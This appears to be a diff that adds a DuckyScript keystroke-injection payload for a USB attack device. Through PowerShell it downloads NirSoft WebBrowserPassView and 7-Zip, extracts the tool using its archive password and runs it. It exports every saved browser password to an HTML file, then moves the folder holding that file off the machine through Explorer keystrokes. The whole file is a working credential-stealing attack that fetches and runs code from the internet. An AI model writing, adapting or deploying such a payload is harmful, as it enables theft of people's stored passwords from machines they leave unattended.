@@ -1,0 +1,61 @@
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip
+ENTER
+DELAY 5000
+STRING wbpv28821@
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 2000
+CTRL A
+CTRL S
+DELAY 1000
+STRING export.html
+TAB
+STRING h
+ENTER
+DELAY 500
+ALT F4
+DELAY 200
+GUI R
+DELAY 200
+STRING C:\
+ENTER
+DELAY 400
+TAB
+TAB
+TAB
+ENTER
+DELAY 300
+STRING C
+DELAY 200
+ENTER
+DELAY 400
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 400
+CTRL C
+ALT TAB
+DELAY 300
+STRING cd\
+ENTER
+DELAY 200
+STRING Move-Item -Path C:\temp
+DELAY 200
+SPACE
+DELAY 100
+CTRL V
+DELAY 100
+ENTER
+STRING exit
+ENTER
